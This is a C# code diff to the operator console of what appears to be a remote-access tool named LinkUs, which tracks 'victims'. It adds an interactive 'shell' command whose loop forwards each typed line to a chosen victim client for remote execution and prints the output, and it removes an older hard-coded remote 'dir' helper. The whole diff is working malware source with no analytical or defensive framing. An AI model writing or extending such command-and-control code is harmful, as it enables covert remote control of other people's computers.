@@ -30,6 +30,7 @@ namespace LinkUs.CommandLine
                         commandResult = ListVictims();
                         break;
                     case "shell":
+                        commandResult = Shell(args.Skip(1).ToArray());
                         break;
                     default:
                         commandResult = $"'{command}' is not recognized as a command.";
@@ -42,13 +43,14 @@ namespace LinkUs.CommandLine
 
             Console.WriteLine(commandResult);
         }
+
+        // ----- Commands
         private static string ListVictims()
         {
             var commandDispatcher = GetCommandDispatcher();
             var defaultCommand = new Command() {Name = "list-victims"};
             return commandDispatcher.ExecuteAsync<Command, string>(defaultCommand).Result;
         }
-
         private static string Ping(string[] arguments)
         {
             var target = "";
@@ -72,6 +74,47 @@ namespace LinkUs.CommandLine
                 return $"Ok. {stopWatch.ElapsedMilliseconds} ms.";
             }
         }
+        private static string Shell(string[] arguments)
+        {
+            var target = "";
+            var p = new FluentCommandLineParser();
+            p.Setup<string>('t', "target")
+                .Callback(x => target = x)
+                .Required();
+            var result = p.Parse(arguments);
+            if (result.HasErrors) {
+                return result.ErrorText;
+            }
+            else {
+                ProcessShell(ClientId.Parse(target));
+                return "Shell closed.";
+            }
+        }
+        private static void ProcessShell(ClientId targetId)
+        {
+            var commandDispatcher = GetCommandDispatcher();
+            while (true) {
+                Console.Write($"shell:{targetId}> ");
+                var input = Console.ReadLine();
+                if (string.IsNullOrEmpty(input)) {
+                    continue;
+                }
+                var arguments = input.Split(new[] {' '}, StringSplitOptions.RemoveEmptyEntries);
+                var commandLine = arguments.First();
+                if (commandLine == "exit") {
+                    break;
+                }
+                var command = new ExecuteRemoteCommandLine {
+                    Name = "ExecuteRemoteCommandLine",
+                    CommandLine = commandLine,
+                    Arguments = arguments.Skip(1).OfType<object>().ToList()
+                };
+                var result = commandDispatcher.ExecuteAsync<ExecuteRemoteCommandLine, string>(command, targetId).Result;
+                Console.WriteLine(result);
+            }
+        }
+
+        // ----- Utils
         private static CommandDispatcher GetCommandDispatcher()
         {
             string host = "127.0.0.1";
@@ -82,19 +125,6 @@ namespace LinkUs.CommandLine
             var packageTransmitter = new PackageTransmitter(connection);
             return new CommandDispatcher(packageTransmitter, new JsonSerializer());
         }
-
-        private static string ExecuteDir(CommandDispatcher commandDispatcher, string[] arguments)
-        {
-            var command = new ExecuteRemoteCommandLine {
-                Name = "ExecuteRemoteCommandLine",
-                CommandLine = "dir",
-                Arguments = new List<object> { }
-            };
-            var targetId = ClientId.Parse(arguments[1]);
-            var result = commandDispatcher.ExecuteAsync<ExecuteRemoteCommandLine, string>(command, targetId).Result;
-            return result;
-        }
-
         private static void WriteInnerException(Exception exception)
         {
             if (exception is AggregateException) {
